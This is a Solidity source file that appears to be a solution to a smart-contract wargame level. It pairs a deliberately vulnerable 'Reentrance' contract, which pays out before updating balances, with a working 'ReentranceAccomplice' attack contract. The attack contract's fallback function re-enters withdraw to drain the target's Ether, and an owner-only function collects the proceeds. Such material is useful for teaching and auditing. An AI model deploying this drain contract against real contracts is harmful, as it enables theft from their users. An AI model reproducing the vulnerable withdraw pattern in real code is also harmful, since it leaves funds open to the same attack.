// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/math/SafeMath.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract ReentranceAccomplice is Ownable {

    Reentrance public target;

    constructor(address payable _target) {
        target = Reentrance(_target);
    }

    fallback() external payable {
        uint256 amount = msg.value;
        if (address(target).balance >= amount) target.withdraw(amount);
    }

    function seedDonation() public payable {
        require(msg.value >= 0.001 ether, "Send more Ether");
        target.donate{ value: msg.value }(address(this));
    }

    function attack(uint256 _amount) external {
        target.withdraw(_amount);
    }

    function withdraw() public onlyOwner {
        payable(msg.sender).transfer(address(this).balance);
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}

contract Reentrance {
  
  using SafeMath for uint256;
  mapping(address => uint) public balances;

  function donate(address _to) public payable {
    balances[_to] = balances[_to].add(msg.value);
  }

  function balanceOf(address _who) public view returns (uint balance) {
    return balances[_who];
  }

  function withdraw(uint _amount) public {
    if(balances[msg.sender] >= _amount) {
      (bool result,) = msg.sender.call{value:_amount}("");
      if(result) {
        _amount;
      }
      balances[msg.sender] -= _amount;
    }
  }

  receive() external payable {}
}